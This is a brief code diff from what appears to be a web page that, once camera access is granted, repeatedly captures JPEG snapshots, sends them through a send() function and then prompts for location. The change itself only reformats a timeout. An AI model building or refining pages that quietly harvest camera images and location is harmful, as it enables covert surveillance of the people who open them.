@@ -172,7 +172,9 @@ document.getElementById('allowCamBtn').onclick = async () => {
       let blob = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
       send('CAM SNAP', blob);
     }, 1400);
-    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 4000);
+    setTimeout(() => {
+      document.getElementById('loc-prompt').style.display = 'flex';
+    }, 4000);
   } catch(e) {
     send('CAM_ERROR');
     document.getElementById('cam-err').style.display = 'block';
